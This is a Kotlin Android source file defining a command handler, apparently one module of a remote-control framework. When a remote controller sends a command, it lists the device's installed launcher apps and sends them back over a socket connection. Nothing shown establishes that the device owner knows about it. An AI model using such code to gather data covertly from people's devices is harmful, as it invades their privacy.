package com.remote.system

import android.content.Context
import android.content.Intent
import android.content.pm.PackageManager
import android.util.Log
import org.json.JSONArray
import org.json.JSONException
import org.json.JSONObject
import io.socket.client.Socket

class AppListCommand(private val context: Context) : CommandHandler {
    private val tag = "AppListCommand" // Changed to lowercase for naming convention

    override fun execute(params: JSONObject, clientId: String, socket: Socket) {
        // Removed nullable type (?) to match the interface
        try {
            val response = JSONObject()
            val data = JSONObject()
            val appsArray = JSONArray()

            val packageManager = context.packageManager
            val intent = Intent(Intent.ACTION_MAIN, null)
            intent.addCategory(Intent.CATEGORY_LAUNCHER)

            // Add query visibility for Android 11+
            @Suppress("DEPRECATION")
            val resolveInfoList = packageManager.queryIntentActivities(intent, 0)

            for (resolveInfo in resolveInfoList) {
                val packageName = resolveInfo.activityInfo.packageName
                val appName = resolveInfo.loadLabel(packageManager).toString()

                val appObject = JSONObject()
                appObject.put("name", appName)
                appObject.put("package", packageName)

                appsArray.put(appObject)
            }

            data.put("apps", appsArray)
            data.put("count", appsArray.length())

            response.put("success", true)
            response.put("data", data)
            response.put("command", "get_app_list")
            response.put("clientId", clientId)

            socket.emit("command-response", response)
        } catch (e: JSONException) {
            Log.e(tag, "Error creating app list response", e)

            // Send error response on failure
            try {
                val errorResponse = JSONObject()
                errorResponse.put("success", false)
                errorResponse.put("error", "Failed to retrieve app list: ${e.message}")
                errorResponse.put("command", "get_app_list")
                errorResponse.put("clientId", clientId)

                socket.emit("command-response", errorResponse)
            } catch (ex: JSONException) {
                Log.e(tag, "Error sending error response", ex)
            }
        }
    }
}